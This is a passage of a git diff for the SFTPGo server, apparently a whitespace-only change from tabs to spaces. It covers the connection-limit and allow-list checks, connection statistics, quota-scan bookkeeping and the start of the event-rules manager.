{\n-\tif isShuttingDown.Load() {\n-\t\treturn ErrShuttingDown\n-\t}\n-\tif Config.MaxTotalConnections == 0 && Config.MaxPerHostConnections == 0 {\n-\t\treturn nil\n-\t}\n-\tif Config.MaxPerHostConnections > 0 {\n-\t\tif transfers := conns.transfers.getTotalFrom(username); transfers >= Config.MaxPerHostConnections {\n-\t\t\tlogger.Info(logSender, \"\", \"active transfers from user %q: %d/%d\", username, transfers, Config.MaxPerHostConnections)\n-\t\t\treturn ErrConnectionDenied\n-\t\t}\n-\t}\n-\tif Config.MaxTotalConnections > 0 {\n-\t\tif transfers := conns.transfers.getTotal(); transfers >= int32(Config.MaxTotalConnections) {\n-\t\t\tlogger.Info(logSender, \"\", \"active transfers %d/%d\", transfers, Config.MaxTotalConnections)\n-\t\t\treturn ErrConnectionDenied\n-\t\t}\n-\t}\n-\treturn nil\n+        if isShuttingDown.Load() {\n+                return ErrShuttingDown\n+        }\n+        if Config.MaxTotalConnections == 0 && Config.MaxPerHostConnections == 0 {\n+                return nil\n+        }\n+        if Config.MaxPerHostConnections > 0 {\n+                if transfers := conns.transfers.getTotalFrom(username); transfers >= Config.MaxPerHostConnections {\n+                        logger.Info(logSender, \"\", \"active transfers from user %q: %d/%d\", username, transfers, Config.MaxPerHostConnections)\n+                        return ErrConnectionDenied\n+                }\n+        }\n+        if Config.MaxTotalConnections > 0 {\n+                if transfers := conns.transfers.getTotal(); transfers >= int32(Config.MaxTotalConnections) {\n+                        logger.Info(logSender, \"\", \"active transfers %d/%d\", transfers, Config.MaxTotalConnections)\n+                        return ErrConnectionDenied\n+                }\n+        }\n+        return nil\n }\n \n // IsNewConnectionAllowed returns an error if the maximum number of concurrent allowed\n // connections is exceeded or a whitelist is defined and the specified ipAddr is not listed\n // or the service is shutting down\n func (conns *ActiveConnections) IsNewConnectionAllowed(ipAddr, protocol string) error {\n-\tif isShuttingDown.Load() {\n-\t\treturn ErrShuttingDown\n-\t}\n-\tif Config.allowList != nil {\n-\t\tisListed, _, err := Config.allowList.IsListed(ipAddr, protocol)\n-\t\tif err != nil {\n-\t\t\tlogger.Error(logSender, \"\", \"unable to query allow list, connection denied, ip %q, protocol %s, err: %v\",\n-\t\t\t\tipAddr, protocol, err)\n-\t\t\treturn ErrConnectionDenied\n-\t\t}\n-\t\tif !isListed {\n-\t\t\treturn ErrConnectionDenied\n-\t\t}\n-\t}\n-\tif Config.MaxTotalConnections == 0 && Config.MaxPerHostConnections == 0 {\n-\t\treturn nil\n-\t}\n-\n-\tif Config.MaxPerHostConnections > 0 {\n-\t\tif total := conns.clients.getTotalFrom(ipAddr); total > Config.MaxPerHostConnections {\n-\t\t\tif !AddDefenderEvent(ipAddr, protocol, HostEventLimitExceeded) {\n-\t\t\t\tlogger.Warn(logSender, \"\", \"connection denied, active connections from IP %q: %d/%d\",\n-\t\t\t\t\tipAddr, total, Config.MaxPerHostConnections)\n-\t\t\t\treturn ErrConnectionDenied\n-\t\t\t}\n-\t\t\tlogger.Info(logSender, \"\", \"active connections from safe IP %q: %d\", ipAddr, total)\n-\t\t}\n-\t}\n-\n-\tif Config.MaxTotalConnections > 0 {\n-\t\tif total := conns.clients.getTotal(); total > int32(Config.MaxTotalConnections) {\n-\t\t\tlogger.Info(logSender, \"\", \"active client connections %d/%d\", total, Config.MaxTotalConnections)\n-\t\t\treturn ErrConnectionDenied\n-\t\t}\n-\n-\t\t// on a single SFTP connection we could have multiple SFTP channels or commands\n-\t\t// so we check the estabilished connections and active uploads too\n-\t\tif transfers := conns.transfers.getTotal(); transfers >= int32(Config.MaxTotalConnections) {\n-\t\t\tlogger.Info(logSender, \"\", \"active transfers %d/%d\", transfers, Config.MaxTotalConnections)\n-\t\t\treturn ErrConnectionDenied\n-\t\t}\n-\n-\t\tconns.RLock()\n-\t\tdefer conns.RUnlock()\n-\n-\t\tif sess := len(conns.connections); sess >= Config.MaxTotalConnections {\n-\t\t\tlogger.Info(logSender, \"\", \"active client sessions %d/%d\", sess, Config.MaxTotalConnections)\n-\t\t\treturn ErrConnectionDenied\n-\t\t}\n-\t}\n-\n-\treturn nil\n+        if isShuttingDown.Load() {\n+                return ErrShuttingDown\n+        }\n+        if Config.allowList != nil {\n+                isListed, _, err := Config.allowList.IsListed(ipAddr, protocol)\n+                if err != nil {\n+                        logger.Error(logSender, \"\", \"unable to query allow list, connection denied, ip %q, protocol %s, err: %v\",\n+                                ipAddr, protocol, err)\n+                        return ErrConnectionDenied\n+                }\n+                if !isListed {\n+                        return ErrConnectionDenied\n+                }\n+        }\n+        if Config.MaxTotalConnections == 0 && Config.MaxPerHostConnections == 0 {\n+                return nil\n+        }\n+\n+        if Config.MaxPerHostConnections > 0 {\n+                if total := conns.clients.getTotalFrom(ipAddr); total > Config.MaxPerHostConnections {\n+                        if !AddDefenderEvent(ipAddr, protocol, HostEventLimitExceeded) {\n+                                logger.Warn(logSender, \"\", \"connection denied, active connections from IP %q: %d/%d\",\n+                                        ipAddr, total, Config.MaxPerHostConnections)\n+                                return ErrConnectionDenied\n+                        }\n+                        logger.Info(logSender, \"\", \"active connections from safe IP %q: %d\", ipAddr, total)\n+                }\n+        }\n+\n+        if Config.MaxTotalConnections > 0 {\n+                if total := conns.clients.getTotal(); total > int32(Config.MaxTotalConnections) {\n+                        logger.Info(logSender, \"\", \"active client connections %d/%d\", total, Config.MaxTotalConnections)\n+                        return ErrConnectionDenied\n+                }\n+\n+                // on a single SFTP connection we could have multiple SFTP channels or commands\n+                // so we check the estabilished connections and active uploads too\n+                if transfers := conns.transfers.getTotal(); transfers >= int32(Config.MaxTotalConnections) {\n+                        logger.Info(logSender, \"\", \"active transfers %d/%d\", transfers, Config.MaxTotalConnections)\n+                        return ErrConnectionDenied\n+                }\n+\n+                conns.RLock()\n+                defer conns.RUnlock()\n+\n+                if sess := len(conns.connections); sess >= Config.MaxTotalConnections {\n+                        logger.Info(logSender, \"\", \"active client sessions %d/%d\", sess, Config.MaxTotalConnections)\n+                        return ErrConnectionDenied\n+                }\n+        }\n+\n+        return nil\n }\n \n // GetStats returns stats for active connections\n func (conns *ActiveConnections) GetStats(role string) []ConnectionStatus {\n-\tconns.RLock()\n-\tdefer conns.RUnlock()\n-\n-\tstats := make([]ConnectionStatus, 0, len(conns.connections))\n-\tnode := dataprovider.GetNodeName()\n-\tfor _, c := range conns.connections {\n-\t\tif role == \"\" || c.GetRole() == role {\n-\t\t\tstat := ConnectionStatus{\n-\t\t\t\tUsername:       c.GetUsername(),\n-\t\t\t\tConnectionID:   c.GetID(),\n-\t\t\t\tClientVersion:  c.GetClientVersion(),\n-\t\t\t\tRemoteAddress:  c.GetRemoteAddress(),\n-\t\t\t\tConnectionTime: util.GetTimeAsMsSinceEpoch(c.GetConnectionTime()),\n-\t\t\t\tLastActivity:   util.GetTimeAsMsSinceEpoch(c.GetLastActivity()),\n-\t\t\t\tCurrentTime:    util.GetTimeAsMsSinceEpoch(time.Now()),\n-\t\t\t\tProtocol:       c.GetProtocol(),\n-\t\t\t\tCommand:        c.GetCommand(),\n-\t\t\t\tTransfers:      c.GetTransfers(),\n-\t\t\t\tNode:           node,\n-\t\t\t}\n-\t\t\tstats = append(stats, stat)\n-\t\t}\n-\t}\n-\treturn stats\n+        conns.RLock()\n+        defer conns.RUnlock()\n+\n+        stats := make([]ConnectionStatus, 0, len(conns.connections))\n+        node := dataprovider.GetNodeName()\n+        for _, c := range conns.connections {\n+                if role == \"\" || c.GetRole() == role {\n+                        stat := ConnectionStatus{\n+                                Username:       c.GetUsername(),\n+                                ConnectionID:   c.GetID(),\n+                                ClientVersion:  c.GetClientVersion(),\n+                                RemoteAddress:  c.GetRemoteAddress(),\n+                                ConnectionTime: util.GetTimeAsMsSinceEpoch(c.GetConnectionTime()),\n+                                LastActivity:   util.GetTimeAsMsSinceEpoch(c.GetLastActivity()),\n+                                CurrentTime:    util.GetTimeAsMsSinceEpoch(time.Now()),\n+                                Protocol:       c.GetProtocol(),\n+                                Command:        c.GetCommand(),\n+                                Transfers:      c.GetTransfers(),\n+                                Node:           node,\n+                        }\n+                        stats = append(stats, stat)\n+                }\n+        }\n+        return stats\n }\n \n // ConnectionStatus returns the status for an active connection\n type ConnectionStatus struct {\n-\t// Logged in username\n-\tUsername string `json:\"username\"`\n-\t// Unique identifier for the connection\n-\tConnectionID string `json:\"connection_id\"`\n-\t// client's version string\n-\tClientVersion string `json:\"client_version,omitempty\"`\n-\t// Remote address for this connection\n-\tRemoteAddress string `json:\"remote_address\"`\n-\t// Connection time as unix timestamp in milliseconds\n-\tConnectionTime int64 `json:\"connection_time\"`\n-\t// Last activity as unix timestamp in milliseconds\n-\tLastActivity int64 `json:\"last_activity\"`\n-\t// Current time as unix timestamp in milliseconds\n-\tCurrentTime int64 `json:\"current_time\"`\n-\t// Protocol for this connection\n-\tProtocol string `json:\"protocol\"`\n-\t// active uploads/downloads\n-\tTransfers []ConnectionTransfer `json:\"active_transfers,omitempty\"`\n-\t// SSH command or WebDAV method\n-\tCommand string `json:\"command,omitempty\"`\n-\t// Node identifier, omitted for single node installations\n-\tNode string `json:\"node,omitempty\"`\n+        // Logged in username\n+        Username string `json:\"username\"`\n+        // Unique identifier for the connection\n+        ConnectionID string `json:\"connection_id\"`\n+        // client's version string\n+        ClientVersion string `json:\"client_version,omitempty\"`\n+        // Remote address for this connection\n+        RemoteAddress string `json:\"remote_address\"`\n+        // Connection time as unix timestamp in milliseconds\n+        ConnectionTime int64 `json:\"connection_time\"`\n+        // Last activity as unix timestamp in milliseconds\n+        LastActivity int64 `json:\"last_activity\"`\n+        // Current time as unix timestamp in milliseconds\n+        CurrentTime int64 `json:\"current_time\"`\n+        // Protocol for this connection\n+        Protocol string `json:\"protocol\"`\n+        // active uploads/downloads\n+        Transfers []ConnectionTransfer `json:\"active_transfers,omitempty\"`\n+        // SSH command or WebDAV method\n+        Command string `json:\"command,omitempty\"`\n+        // Node identifier, omitted for single node installations\n+        Node string `json:\"node,omitempty\"`\n }\n \n // ActiveQuotaScan defines an active quota scan for a user\n type ActiveQuotaScan struct {\n-\t// Username to which the quota scan refers\n-\tUsername string `json:\"username\"`\n-\t// quota scan start time as unix timestamp in milliseconds\n-\tStartTime int64  `json:\"start_time\"`\n-\tRole      string `json:\"-\"`\n+        // Username to which the quota scan refers\n+        Username string `json:\"username\"`\n+        // quota scan start time as unix timestamp in milliseconds\n+        StartTime int64  `json:\"start_time\"`\n+        Role      string `json:\"-\"`\n }\n \n // ActiveVirtualFolderQuotaScan defines an active quota scan for a virtual folder\n type ActiveVirtualFolderQuotaScan struct {\n-\t// folder name to which the quota scan refers\n-\tName string `json:\"name\"`\n-\t// quota scan start time as unix timestamp in milliseconds\n-\tStartTime int64 `json:\"start_time\"`\n+        // folder name to which the quota scan refers\n+        Name string `json:\"name\"`\n+        // quota scan start time as unix timestamp in milliseconds\n+        StartTime int64 `json:\"start_time\"`\n }\n \n // ActiveScans holds the active quota scans\n type ActiveScans struct {\n-\tsync.RWMutex\n-\tUserScans   []ActiveQuotaScan\n-\tFolderScans []ActiveVirtualFolderQuotaScan\n+        sync.RWMutex\n+        UserScans   []ActiveQuotaScan\n+        FolderScans []ActiveVirtualFolderQuotaScan\n }\n \n // GetUsersQuotaScans returns the active users quota scans\n func (s *ActiveScans) GetUsersQuotaScans(role string) []ActiveQuotaScan {\n-\ts.RLock()\n-\tdefer s.RUnlock()\n+        s.RLock()\n+        defer s.RUnlock()\n \n-\tscans := make([]ActiveQuotaScan, 0, len(s.UserScans))\n-\tfor _, scan := range s.UserScans {\n-\t\tif role == \"\" || role == scan.Role {\n-\t\t\tscans = append(scans, ActiveQuotaScan{\n-\t\t\t\tUsername:  scan.Username,\n-\t\t\t\tStartTime: scan.StartTime,\n-\t\t\t})\n-\t\t}\n-\t}\n+        scans := make([]ActiveQuotaScan, 0, len(s.UserScans))\n+        for _, scan := range s.UserScans {\n+                if role == \"\" || role == scan.Role {\n+                        scans = append(scans, ActiveQuotaScan{\n+                                Username:  scan.Username,\n+                                StartTime: scan.StartTime,\n+                        })\n+                }\n+        }\n \n-\treturn scans\n+        return scans\n }\n \n // AddUserQuotaScan adds a user to the ones with active quota scans.\n // Returns false if the user has a quota scan already running\n func (s *ActiveScans) AddUserQuotaScan(username, role string) bool {\n-\ts.Lock()\n-\tdefer s.Unlock()\n-\n-\tfor _, scan := range s.UserScans {\n-\t\tif scan.Username == username {\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\ts.UserScans = append(s.UserScans, ActiveQuotaScan{\n-\t\tUsername:  username,\n-\t\tStartTime: util.GetTimeAsMsSinceEpoch(time.Now()),\n-\t\tRole:      role,\n-\t})\n-\treturn true\n+        s.Lock()\n+        defer s.Unlock()\n+\n+        for _, scan := range s.UserScans {\n+                if scan.Username == username {\n+                        return false\n+                }\n+        }\n+        s.UserScans = append(s.UserScans, ActiveQuotaScan{\n+                Username:  username,\n+                StartTime: util.GetTimeAsMsSinceEpoch(time.Now()),\n+                Role:      role,\n+        })\n+        return true\n }\n \n // RemoveUserQuotaScan removes a user from the ones with active quota scans.\n // Returns false if the user has no active quota scans\n func (s *ActiveScans) RemoveUserQuotaScan(username string) bool {\n-\ts.Lock()\n-\tdefer s.Unlock()\n+        s.Lock()\n+        defer s.Unlock()\n \n-\tfor idx, scan := range s.UserScans {\n-\t\tif scan.Username == username {\n-\t\t\tlastIdx := len(s.UserScans) - 1\n-\t\t\ts.UserScans[idx] = s.UserScans[lastIdx]\n-\t\t\ts.UserScans = s.UserScans[:lastIdx]\n-\t\t\treturn true\n-\t\t}\n-\t}\n+        for idx, scan := range s.UserScans {\n+                if scan.Username == username {\n+                        lastIdx := len(s.UserScans) - 1\n+                        s.UserScans[idx] = s.UserScans[lastIdx]\n+                        s.UserScans = s.UserScans[:lastIdx]\n+                        return true\n+                }\n+        }\n \n-\treturn false\n+        return false\n }\n \n // GetVFoldersQuotaScans returns the active quota scans for virtual folders\n func (s *ActiveScans) GetVFoldersQuotaScans() []ActiveVirtualFolderQuotaScan {\n-\ts.RLock()\n-\tdefer s.RUnlock()\n-\tscans := make([]ActiveVirtualFolderQuotaScan, len(s.FolderScans))\n-\tcopy(scans, s.FolderScans)\n-\treturn scans\n+        s.RLock()\n+        defer s.RUnlock()\n+        scans := make([]ActiveVirtualFolderQuotaScan, len(s.FolderScans))\n+        copy(scans, s.FolderScans)\n+        return scans\n }\n \n // AddVFolderQuotaScan adds a virtual folder to the ones with active quota scans.\n // Returns false if the folder has a quota scan already running\n func (s *ActiveScans) AddVFolderQuotaScan(folderName string) bool {\n-\ts.Lock()\n-\tdefer s.Unlock()\n+        s.Lock()\n+        defer s.Unlock()\n \n-\tfor _, scan := range s.FolderScans {\n-\t\tif scan.Name == folderName {\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\ts.FolderScans = append(s.FolderScans, ActiveVirtualFolderQuotaScan{\n-\t\tName:      folderName,\n-\t\tStartTime: util.GetTimeAsMsSinceEpoch(time.Now()),\n-\t})\n-\treturn true\n+        for _, scan := range s.FolderScans {\n+                if scan.Name == folderName {\n+                        return false\n+                }\n+        }\n+        s.FolderScans = append(s.FolderScans, ActiveVirtualFolderQuotaScan{\n+                Name:      folderName,\n+                StartTime: util.GetTimeAsMsSinceEpoch(time.Now()),\n+        })\n+        return true\n }\n \n // RemoveVFolderQuotaScan removes a folder from the ones with active quota scans.\n // Returns false if the folder has no active quota scans\n func (s *ActiveScans) RemoveVFolderQuotaScan(folderName string) bool {\n-\ts.Lock()\n-\tdefer s.Unlock()\n-\n-\tfor idx, scan := range s.FolderScans {\n-\t\tif scan.Name == folderName {\n-\t\t\tlastIdx := len(s.FolderScans) - 1\n-\t\t\ts.FolderScans[idx] = s.FolderScans[lastIdx]\n-\t\t\ts.FolderScans = s.FolderScans[:lastIdx]\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\n-\treturn false\n+        s.Lock()\n+        defer s.Unlock()\n+\n+        for idx, scan := range s.FolderScans {\n+                if scan.Name == folderName {\n+                        lastIdx := len(s.FolderScans) - 1\n+                        s.FolderScans[idx] = s.FolderScans[lastIdx]\n+                        s.FolderScans = s.FolderScans[:lastIdx]\n+                        return true\n+                }\n+        }\n+\n+        return false\n }\ndiff --git a/internal/common/eventmanager.go b/internal/common/eventmanager.go\nindex 74959076..e3d3bd62 100644\n--- a/internal/common/eventmanager.go\n+++ b/internal/common/eventmanager.go\n@@ -15,2879 +15,2881 @@\n package common\n \n import (\n-\t\"bytes\"\n-\t\"context\"\n-\t\"encoding/csv\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"mime\"\n-\t\"mime/multipart\"\n-\t\"net/http\"\n-\t\"net/textproto\"\n-\t\"net/url\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path\"\n-\t\"path/filepath\"\n-\t\"slices\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"sync\"\n-\t\"sync/atomic\"\n-\t\"time\"\n-\n-\t\"github.com/bmatcuk/doublestar/v4\"\n-\t\"github.com/klauspost/compress/zip\"\n-\t\"github.com/robfig/cron/v3\"\n-\t\"github.com/rs/xid\"\n-\t\"github.com/sftpgo/sdk\"\n-\t\"github.com/wneessen/go-mail\"\n-\n-\t\"github.com/drakkan/sftpgo/v2/internal/dataprovider\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/logger\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/plugin\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/smtp\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/util\"\n-\t\"github.com/drakkan/sftpgo/v2/internal/vfs\"\n+        \"bytes\"\n+        \"context\"\n+        \"encoding/csv\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"io\"\n+        \"mime\"\n+        \"mime/multipart\"\n+        \"net/http\"\n+        \"net/textproto\"\n+        \"net/url\"\n+        \"os\"\n+        \"os/exec\"\n+        \"path\"\n+        \"path/filepath\"\n+        \"slices\"\n+        \"strconv\"\n+        \"strings\"\n+        \"sync\"\n+        \"sync/atomic\"\n+        \"time\"\n+\n+        \"github.com/bmatcuk/doublestar/v4\"\n+        \"github.com/klauspost/compress/zip\"\n+        \"github.com/robfig/cron/v3\"\n+        \"github.com/rs/xid\"\n+        \"github.com/sftpgo/sdk\"\n+        \"github.com/wneessen/go-mail\"\n+\n+        \"github.com/drakkan/sftpgo/v2/internal/dataprovider\"\n+        \"github.com/drakkan/sftpgo/v2/internal/logger\"\n+        \"github.com/drakkan/sftpgo/v2/internal/plugin\"\n+        \"github.com/drakkan/sftpgo/v2/internal/smtp\"\n+        \"github.com/drakkan/sftpgo/v2/internal/util\"\n+        \"github.com/drakkan/sftpgo/v2/internal/vfs\"\n )\n \n const (\n-\tipBlockedEventName       = \"IP Blocked\"\n-\tmaxAttachmentsSize       = int64(10 * 1024 * 1024)\n-\tobjDataPlaceholder       = \"{{ObjectData}}\"\n-\tobjDataPlaceholderString = \"{{ObjectDataString}}\"\n-\tdateTimeMillisFormat     = \"2006-01-02T15:04:05.000\"\n+        ipBlockedEventName       = \"IP Blocked\"\n+        maxAttachmentsSize       = int64(10 * 1024 * 1024)\n+        objDataPlaceholder       = \"{{ObjectData}}\"\n+        objDataPlaceholderString = \"{{ObjectDataString}}\"\n+        dateTimeMillisFormat     = \"2006-01-02T15:04:05.000\"\n )\n \n // Supported IDP login events\n const (\n-\tIDPLoginUser  = \"IDP login user\"\n-\tIDPLoginAdmin = \"IDP login admin\"\n+        IDPLoginUser  = \"IDP login user\"\n+        IDPLoginAdmin = \"IDP login admin\"\n )\n \n var (\n-\t// eventManager handle the supported event rules actions\n-\teventManager          eventRulesContainer\n-\tmultipartQuoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\")\n+        // eventManager handle the supported event rules actions\n+        eventManager          eventRulesContainer\n+        multipartQuoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\")\n )\n \n func init() {\n-\teventManager = eventRulesContainer{\n-\t\tschedulesMapping: make(map[string][]cron.EntryID),\n-\t\t// arbitrary maximum number of concurrent asynchronous tasks,\n-\t\t// each task could execute multiple actions\n-\t\tconcurrencyGuard: make(chan struct{}, 200),\n-\t}\n-\tdataprovider.SetEventRulesCallbacks(eventManager.loadRules, eventManager.RemoveRule,\n-\t\tfunc(operation, executor, ip, objectType, objectName, role string, object plugin.Renderer) {\n-\t\t\tp := EventParams{\n-\t\t\t\tName:       executor,\n-\t\t\t\tObjectName: objectName,\n-\t\t\t\tEvent:      operation,\n-\t\t\t\tStatus:     1,\n-\t\t\t\tObjectType: objectType,\n-\t\t\t\tIP:         ip,\n-\t\t\t\tRole:       role,\n-\t\t\t\tTimestamp:  time.Now(),\n-\t\t\t\tObject:     object,\n-\t\t\t}\n-\t\t\tif u, ok := object.(*dataprovider.User); ok {\n-\t\t\t\tp.Email = u.Email\n-\t\t\t} else if a, ok := object.(*dataprovider.Admin); ok {\n-\t\t\t\tp.Email = a.Email\n-\t\t\t}\n-\t\t\teventManager.handleProviderEvent(p)\n-\t\t})\n+        eventManager = eventRulesContainer{\n+                schedulesMapping: make(map[string][]cron.EntryID),\n+                // arbitrary maximum number of concurrent asynchronous tasks,\n+                // each task could execute multiple actions\n+                concurrencyGuard: make(chan struct{}, 200),\n+        }\n+        dataprovider.SetEventRulesCallbacks(eventManager.loadRules, eventManager.RemoveRule,\n+                func(operation, executor, ip, objectType, objectName, role string, object plugin.Renderer) {\n+                        p := EventParams{\n+                                Name:       executor,\n+                                ObjectName: objectName,\n+                                Event:      operation,\n+                                Status:     1,\n+                                ObjectType: objectType,\n+                                IP:         ip,\n+                                Role:       role,\n+                                Timestamp:  time.Now(),\n+                                Object:     object,\n+                        }\n+                        if u, ok := object.(*dataprovider.User); ok {\n+                                p.Email = u.Email\n+                        } else if a, ok := object.(*dataprovider.Admin); ok {\n+                                p.Email = a.Email\n+                        }\n+                        eventManager.handleProviderEvent(p)\n+                })\n }\n \n // HandleCertificateEvent checks and executes action rules for certificate events\n func HandleCertificateEvent(params EventParams) {\n-\teventManager.handleCertificateEvent(params)\n+        eventManager.handleCertificateEvent(params)\n }\n \n // HandleIDPLoginEvent executes actions defined for a successful login from an Identity Provider\n func HandleIDPLoginEvent(params EventParams, customFields *map[string]any) (*dataprovider.User, *dataprovider.Admin, error) {\n-\treturn eventManager.handleIDPLoginEvent(params, customFields)\n+        return eventManager.handleIDPLoginEvent(params, customFields)\n }\n \n // eventRulesContainer stores event rules by trigger\n type eventRulesContainer struct {\n-\tsync.RWMutex\n-\tlastLoad          atomic.Int64\n-\tFsEvents          []dataprovider.EventRule\n-\tProviderEvents    []dataprovider.EventRule\n-\tSchedules         []dataprovider.EventRule\n-\tIPBlockedEvents   []dataprovider.EventRule\n-\tCertificateEvents []dataprovider.EventRule\n-\tIPDLoginEvents    []dataprovider.EventRule\n-\tschedulesMapping  map[string][]cron.EntryID\n-\tconcurrencyGuard  chan struct{}\n+        sync.RWMutex\n+        lastLoad          atomic.Int64\n+        FsEvents          []dataprovider.EventRule\n+        ProviderEvents    []dataprovider.EventRule\n+        Schedules         []dataprovider.EventRule\n+        IPBlockedEvents   []dataprovider.EventRule\n+        CertificateEvents []dataprovider.EventRule\n+        IPDLoginEvents    []dataprovider.EventRule\n+        schedulesMapping  map[string][]cron.EntryID\n+        concurrencyGuard  chan struct{}\n }\n \n func (r *eventRulesContainer) addAsyncTask() {\n-\tactiveHooks.Add(1)\n-\tr.concurrencyGuard <- struct{}{}\n+        activeHooks.Add(1)\n+        r.concurrencyGuard <- struct{}{}\n }\n \n func (r *eventRulesContainer) removeAsyncTask() {\n-\tactiveHooks.Add(-1)\n-\t<-r.concurrencyGuard\n+        activeHooks.Add(-1)\n+        <-r.concurrencyGuard\n }\n \n func (r *eventRulesContainer) getLastLoadTime() int64 {\n-\treturn r.lastLoad.Load()\n+        return r.lastLoad.Load()\n }\n \n func (r *eventRulesContainer) setLastLoadTime(modTime int64) {\n-\tr.lastLoad.Store(modTime)\n+        r.lastLoad.Store(modTime)\n }\n \n // RemoveRule deletes the rule with the specified name\n func (r *eventRulesContainer) RemoveRule(name string) {\n-\tr.Lock()\n-\tdefer r.Unlock()\n+        r.Lock()\n+        defer r.Unlock()\n \n-\tr.removeRuleInternal(name)\n-\teventManagerLog(logger.LevelDebug, \"event rules updated after delete, fs events: %d, provider events: %d, schedules: %d\",\n-\t\tlen(r.FsEvents), len(r.ProviderEvents), len(r.Schedules))\n+        r.removeRuleInternal(name)\n+        eventManagerLog(logger.LevelDebug, \"event rules updated after delete, fs events: %d, provider events: %d, schedules: %d\",\n+                len(r.FsEvents), len(r.ProviderEvents), len(r.Schedules))\n }\n \n func (r *eventRulesContainer) removeRuleInternal(name string) {\n-\tfor idx := range r.FsEvents {\n-\t\tif r.FsEvents[idx].Name == name {\n-\t\t\tlastIdx := len(r.FsEvents) - 1\n-\t\t\tr.FsEvents[idx] = r.FsEvents[lastIdx]\n-\t\t\tr.FsEvents = r.FsEvents[:lastIdx]\n-\t\t\teventManagerLog(logger.LevelDebug, \"removed rule %q from fs events\", name)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\tfor idx := range r.ProviderEvents {\n-\t\tif r.ProviderEvents[idx].Name == name {\n-\t\t\tlastIdx := len(r.ProviderEvents) - 1\n-\t\t\tr.ProviderEvents[idx] = r.ProviderEvents[lastIdx]\n-\t\t\tr.ProviderEvents = r.ProviderEvents[:lastIdx]\n-\t\t\teventManagerLog(logger.LevelDebug, \"removed rule %q from provider events\", name)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\tfor idx := range r.IPBlockedEvents {\n-\t\tif r.IPBlockedEvents[idx].Name == name {\n-\t\t\tlastIdx := len(r.IPBlockedEvents) - 1\n-\t\t\tr.IPBlockedEvents[idx] = r.IPBlockedEvents[lastIdx]\n-\t\t\tr.IPBlockedEvents = r.IPBlockedEvents[:lastIdx]\n-\t\t\teventManagerLog(logger.LevelDebug, \"removed rule %q from IP blocked events\", name)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\tfor idx := range r.CertificateEvents {\n-\t\tif r.CertificateEvents[idx].Name == name {\n-\t\t\tlastIdx := len(r.CertificateEvents) - 1\n-\t\t\tr.CertificateEvents[idx] = r.CertificateEvents[lastIdx]\n-\t\t\tr.CertificateEvents = r.CertificateEvents[:lastIdx]\n-\t\t\teventManagerLog(logger.LevelDebug, \"removed rule %q from certificate events\", name)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\tfor idx := range r.IPDLoginEvents {\n-\t\tif r.IPDLoginEvents[idx].Name == name {\n-\t\t\tlastIdx := len(r.IPDLoginEvents) - 1\n-\t\t\tr.IPDLoginEvents[idx] = r.IPDLoginEvents[lastIdx]\n-\t\t\tr.IPDLoginEvents = r.IPDLoginEvents[:lastIdx]\n-\t\t\teventManagerLog(logger.LevelDebug, \"removed rule %q from IDP login events\", name)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\tfor idx := range r.Schedules {\n-\t\tif r.Schedules[idx].Name == name {\n-\t\t\tif schedules, ok := r.schedulesMapping[name]; ok {\n-\t\t\t\tfor _, entryID := range schedules {\n-\t\t\t\t\teventManagerLog(logger.LevelDebug, \"removing scheduled entry id %d for rule %q\", entryID, name)\n-\t\t\t\t\teventScheduler.Remove(entryID)\n-\t\t\t\t}\n-\t\t\t\tdelete(r.schedulesMapping, name)\n-\t\t\t}\n-\n-\t\t\tlastIdx := len(r.Schedules) - 1\n-\t\t\tr.Schedules[idx] = r.Schedules[lastIdx]\n-\t\t\tr.Schedules = r.Schedules[:lastIdx]\n-\t\t\teventManagerLog(logger.LevelDebug, \"removed rule %q from scheduled events\", name)\n-\t\t\treturn\n-\t\t}\n-\t}\n+        for idx := range r.FsEvents {\n+                if r.FsEvents[idx].Name == name {\n+                        lastIdx := len(r.FsEvents) - 1\n+                        r.FsEvents[idx] = r.FsEvents[lastIdx]\n+                        r.FsEvents = r.FsEvents[:lastIdx]\n+                        eventManagerLog(logger.LevelDebug, \"removed rule %q from fs events\", name)\n+                        return\n+                }\n+        }\n+        for idx := range r.ProviderEvents {\n+                if r.ProviderEvents[idx].Name == name {\n+                        lastIdx := len(r.ProviderEvents) - 1\n+                        r.ProviderEvents[idx] = r.ProviderEvents[lastIdx]\n+                        r.ProviderEvents = r.ProviderEvents[:lastIdx]\n+                        eventManagerLog(logger.LevelDebug, \"removed rule %q from provider events\", name)\n+                        return\n+                }\n+        }\n+        for idx := range r.IPBlockedEvents {\n+                if r.IPBlockedEvents[idx].Name == name {\n+                        lastIdx := len(r.IPBlockedEvents) - 1\n+                        r.IPBlockedEvents[idx] = r.IPBlockedEvents[lastIdx]\n+                        r.IPBlockedEvents = r.IPBlockedEvents[:lastIdx]\n+                        eventManagerLog(logger.LevelDebug, \"removed rule %q from IP blocked events\", name)\n+                        return\n+                }\n+        }\n+        for idx := range r.CertificateEvents {\n+                if r.CertificateEvents[idx].Name == name {\n+                        lastIdx := len(r.CertificateEvents) - 1\n+                        r.CertificateEvents[idx] = r.CertificateEvents[lastIdx]\n+                        r.CertificateEvents = r.CertificateEvents[:lastIdx]\n+                        eventManagerLog(logger.LevelDebug, \"removed rule %q from certificate events\", name)\n+                        return\n+                }\n+        }\n+        for idx := range r.IPDLoginEvents {\n+                if r.IPDLoginEvents[idx].Name == name {\n+                        lastIdx := len(r.IPDLoginEvents) - 1\n+                        r.IPDLoginEvents[idx] = r.IPDLoginEvents[lastIdx]\n+                        r.IPDLoginEvents = r.IPDLoginEvents[:lastIdx]\n+                        